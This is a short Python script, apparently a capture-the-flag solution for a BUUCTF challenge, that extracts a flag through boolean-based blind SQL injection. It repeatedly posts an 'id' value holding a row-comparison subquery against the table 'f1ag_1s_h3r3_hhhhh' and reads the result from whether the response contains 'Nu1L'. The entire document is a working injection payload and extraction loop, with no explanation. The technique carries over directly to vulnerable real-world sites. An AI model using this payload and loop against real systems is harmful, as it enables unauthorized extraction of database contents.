import requests
url = 'http://bfd71058-3cf0-4e87-8731-8935a651f051.node3.buuoj.cn/'
def add(flag):
    res = ''
    res += flag
    return res
flag = ''
for i in range(1,200):
    for char in range(32, 127):
        hexchar = add(flag + chr(char))
        payload = '2||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'.format(hexchar)
        #print(payload)
        data = {'id':payload}
        r = requests.post(url=url, data=data)
        text = r.text
        if 'Nu1L' in r.text:
            flag += chr(char-1)
            print(flag)
            break